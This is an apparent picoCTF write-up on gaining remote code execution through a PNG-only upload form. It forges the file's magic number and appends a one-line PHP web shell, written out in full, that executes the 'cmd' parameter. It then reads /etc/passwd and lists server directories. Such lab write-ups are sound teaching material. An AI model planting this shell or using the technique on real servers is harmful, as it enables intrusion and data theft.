

**Objective:** 
Exploit a web application that only accepts `.png` files to achieve Remote Code Execution (RCE).

## Steps and Analysis:

### 1. Initial Observation:
- Accessed the website which prompted for a `.png` file upload.
- Screenshot:
- ![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/ab871f28-4dec-44a9-a3fe-3aae2b6af7eb)

### 2. Dir busting
- `gobuster dir -u http://gobuster dir -u http://atlas.picoctf.net:62175/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt`
- Output
	- ![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/63135799-205b-4592-af6b-2623e4bd36b6)


### 3. File Preparation and Magic Number Manipulation:
- Downloaded a random image from the internet to use as a base.
- Altered the magic number in the file to match a PNG file.
- Screenshot of modified magic number: ![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/8ec9cbff-3104-42f8-9a26-4d4253e799bb)

- _Note: The magic number (file signature) was altered to bypass file type checks by the website._


### 4. Embedding PHP Code:
- Appended PHP code to the image file to facilitate RCE using the following command:
  ```
  echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' >> PNG.png.php
  ```

### 5. Accessing the Uploaded File and Testing RCE:
- Navigated to the uploaded file’s URL: `atlas.picoctf.net:63517/uploads/PNG.png.php`
- Screenshots of the uploaded file in action: [File Location] ![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/1e409c34-9675-41a0-8221-15fba59302db)
, 
- Confirmed RCE by executing a test command (`cat /etc/passwd`):
  ```
  atlas.picoctf.net:63517/uploads/PNG.png.php?cmd=cat /etc/passwd
  ```
- Screenshot of test command execution: ![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/fb36784f-8d9b-4557-864a-67f9673f595c)


### 6. Exploring the Server:
- Used the `pwd` command to print the current working directory, revealing the path: `/var/www/html/uploads`
-  `atlas.picoctf.net:63517/uploads/PNG.png.php?cmd=pwd`
	- `/var/www/html/uploads`

### 7. Listing Directory Contents:
- Listed directories in `/var/www/html`, identifying a file named `GNTDOMBWGIZDE.txt` as potentially interesting.
- Screenshot of directory listing: [Directory Listing]
-![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/b9b50b6d-8062-43f0-86c3-70c38d8d1338)


### 8. Accessing the Identified File:
- Decided to investigate the `GNTDOMBWGIZDE.txt` file.
- Screenshot of the file's contents: ![image](https://github.com/iDeletedMyCDrive/PicoCTF/assets/163599712/8386e426-67fc-4dd5-9378-5c7b370b4cc7)


**Conclusion:** 
Successfully achieved RCE by manipulating an image file’s magic number and embedding PHP code, allowing exploration of the server and identification of potential points of interest.
